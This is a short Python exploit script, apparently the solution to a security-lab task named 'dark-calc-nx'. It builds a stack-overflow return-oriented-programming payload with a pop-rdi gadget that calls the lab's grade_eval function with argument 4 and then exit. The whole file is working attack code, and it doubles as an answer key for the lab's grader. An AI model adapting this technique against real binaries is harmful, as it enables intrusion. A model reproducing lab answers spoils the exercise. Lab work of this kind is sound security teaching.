#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import struct
import sys

GRADE_EVAL  = 0x401978
EXIT_PLT    = 0x4016E0
RET         = 0x401A34   # plain `ret`
POP_RDI     = 0x401A33   # 5f c3  ->  pop rdi ; ret
COMMAND_BUF = 0x602090   # destination of input()'s strcpy (not used by chain)


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def main() -> None:
    payload = p64(GRADE_EVAL)       # expression[0:8]; also stops strcpy()
    payload += b"A" * 8             # expression[8:16]
    payload += b"B" * 8             # saved RBP
    payload += p64(RET)             # alignment slide
    payload += p64(POP_RDI)         # rdi = 4
    payload += p64(4)
    payload += p64(GRADE_EVAL)      # grade_eval(4)
    payload += p64(EXIT_PLT)        # exit

    assert b"\x0a" not in payload
    sys.stdout.buffer.write(payload)


if __name__ == "__main__":
    main()
